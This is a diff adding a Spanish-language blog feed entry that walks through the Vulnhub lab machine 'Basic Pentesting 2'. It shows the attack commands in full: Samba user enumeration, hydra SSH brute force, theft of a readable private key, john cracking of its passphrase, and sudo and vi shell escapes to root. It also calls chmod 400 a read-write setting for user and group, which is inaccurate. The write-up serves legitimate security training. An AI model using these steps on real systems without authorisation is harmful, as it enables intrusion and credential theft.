@@ -176,4 +176,71 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 			
 		</content>
 	</entry>
+	
+	<entry>
+		<title>Vulnhub #0: CSEC Basic Pentesting 2</title>
+		<link href="https://update-me.com/posts/basic_pentesting_2/"/>
+		<updated>2025-05-11T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/basic_pentesting_2/</id>
+		<content type="html">
+		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/basic-pentesting-2,241/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;descubrimiento-de-hosts&quot;&gt;Descubrimiento de hosts &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-hosts&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Tras iniciar la maquina escaneamos con &lt;code&gt;sudo netdiscover&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Estos son las IP del lab:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Ubuntu(host): 192.168.0.20&lt;br&gt;Kali(VM):     192.168.0.16&lt;br&gt;Victima:      192.168.0.17&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;servicios&quot;&gt;Servicios &lt;a class=&quot;direct-link&quot; href=&quot;#servicios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si lanzamos &lt;code&gt;nmap -sT -sV -A -vvv 192.168.0.17&lt;/code&gt; y no obtenemos ninguna vulnerabilidad explotable.&lt;/p&gt;
+&lt;p&gt;Sin embargo, podemos intentar enumerar usuarios de samba con &lt;code&gt;enum4linux &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br&gt;
+Obtenemos dos usuarios:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;kay&lt;br&gt;jan&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;ataque-ssh&quot;&gt;Ataque SSH &lt;a class=&quot;direct-link&quot; href=&quot;#ataque-ssh&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Lanzamos hydra con rockyou.txt usando &lt;code&gt;hydra -l kay -P ./rockyou.txt ssh://192.168.0.17&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;La contraseña es &lt;code&gt;armando&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Una vez dentro podemos hacer &lt;code&gt;ls -lisaR /home&lt;/code&gt; para analizar las carpetas de usuarios.&lt;/p&gt;
+&lt;p&gt;Ahi podemos ver que en la carpeta .ssh del usuario kay tiene un &lt;code&gt;id_rsa&lt;/code&gt; con permisos globales de lectura.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/home/kay/.ssh:
+total 20
+798691 4 drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
+786930 4 drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
+798921 4 -rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
+798917 4 -rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
+798918 4 -rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
+jan@basic2:~$ cat /home/kay/.ssh/id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;usando-una-clave-robada&quot;&gt;Usando una clave robada &lt;a class=&quot;direct-link&quot; href=&quot;#usando-una-clave-robada&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Podemos copiar el archivo y usarlo para intentar entrar en la maquina con &lt;code&gt;ssh kay@ip -i clave-robada&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Whooops! Nos devuelve esto:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Permissions 0664 for &#39;id_key&#39; are too open.&lt;br&gt;It is required that your private key files are NOT accessible by others.&lt;br&gt;This private key will be ignored.&lt;br&gt;Load key &quot;id_key&quot;: bad permissions&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Debemos dar permisos de lectura y escritura para usuario y grupo con &lt;code&gt;chmod 400 clave-robada&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Ahora nos pide la contraseña de la clave.&lt;/p&gt;
+&lt;p&gt;Esa contraseña está DENTRO de nuestro archivo &lt;code&gt;clave-robada&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Convierte la clave a un formato que john entienda con &lt;code&gt;ssh2john clave-robada &amp;gt; clave-formato-john&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Una vez listo podemos romper la contraseña con &lt;code&gt;john clave-formato-john --wordlist=rockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;beeswax          (clave-robada)     &lt;br&gt;1g 0:00:00:00 DONE (2024-09-17 06:09) 12.50g/s 1034Kp/s 1034Kc/s 1034KC/s behlat..bball40&lt;br&gt;Use the &quot;--show&quot; option to display all of the cracked passwords reliably&lt;br&gt;Session completed. &lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si hacemos &lt;code&gt;ssh kay@ip -i clave-robada&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Nos pedirá la contraseña &lt;code&gt;beeswax&lt;/code&gt; descubierta antes.&lt;/p&gt;
+&lt;p&gt;Estamos dentro!&lt;/p&gt;
+&lt;p&gt;¿Que podemos hacer ahora?&lt;/p&gt;
+&lt;h2 id=&quot;escalando-privilegios&quot;&gt;Escalando privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#escalando-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Podemos volver a usar &lt;code&gt;ls -lisaR /home&lt;/code&gt; para listar de nuevo por si hubiera cosas que no hemos visto antes&lt;/p&gt;
+&lt;p&gt;Tenemos un &lt;code&gt;pass.bak&lt;/code&gt; que podemos leer:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;heresareallystrongpasswordthatfollowsthepasswordpolicy$$&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si intentamos usar &lt;code&gt;sudo -l&lt;/code&gt; para ver que podemos lanzar nos pedirá una contraseña.&lt;/p&gt;
+&lt;p&gt;Podemos pasar esa contraseña y ver que podemos lanzar &lt;code&gt;sudo su&lt;/code&gt;&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;[sudo] password for kay: &lt;br&gt;Matching Defaults entries for kay on basic2:&lt;br&gt;    env_reset, mail_badpass,&lt;br&gt;    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin&lt;br&gt;&lt;br&gt;User kay may run the following commands on basic2:&lt;br&gt;    (ALL : ALL) ALL&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tras lanzarlo, ya somos &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;otras-formas-de-conseguir-root%3A&quot;&gt;Otras formas de conseguir &lt;code&gt;root&lt;/code&gt;: &lt;a class=&quot;direct-link&quot; href=&quot;#otras-formas-de-conseguir-root%3A&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;h4 id=&quot;sudo-vi&quot;&gt;sudo vi &lt;a class=&quot;direct-link&quot; href=&quot;#sudo-vi&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;sudo vi&lt;br&gt;Escribimos :!sh y nos devuelve una consola root&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;more&quot;&gt;more &lt;a class=&quot;direct-link&quot; href=&quot;#more&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Escribimos un archivo relativamente largo y lo abrimos con `more` y tenemos algo similar a vi&lt;br&gt;Con !sh podremos abrir otra consola.&lt;/code&gt;&lt;/pre&gt;
+
+			
+		</content>
+	</entry>
 </feed>
